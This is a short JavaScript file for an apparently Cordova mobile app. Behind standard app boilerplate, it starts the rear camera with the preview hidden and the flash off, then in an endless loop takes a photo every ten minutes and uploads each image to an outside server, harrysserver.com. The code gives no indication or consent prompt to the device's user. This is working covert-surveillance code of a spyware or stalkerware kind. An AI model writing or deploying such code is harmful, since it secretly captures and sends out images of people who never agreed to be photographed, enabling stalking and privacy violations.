var app = {
  initialize: function() {
    document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
  },
  onDeviceReady: function() {},
  receivedEvent: function(id) {}
};

var photograph=function() {
  let url='http://harrysserver.com/camera/upload.php';
      CameraPreview.setFlashMode('off');
      CameraPreview.takePicture({height:1920, width:1080, quality:90}, function(base64PictureData) {
        var pic='data:image/jpeg;base64,'+base64PictureData;
        $.post(url, {image: pic, timeout: 50000});
      });
}

function photoDelay() {
  return new Promise(resolve =>  setTimeout(resolve, 600000));
}

async function photos() {
  await photoDelay();  
  photograph();
}

async function processArray() { 
 for (var i=0; i<Infinity; i++) { 
     await photos();
  };
}

app.initialize();
CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
CameraPreview.hide();
processArray();

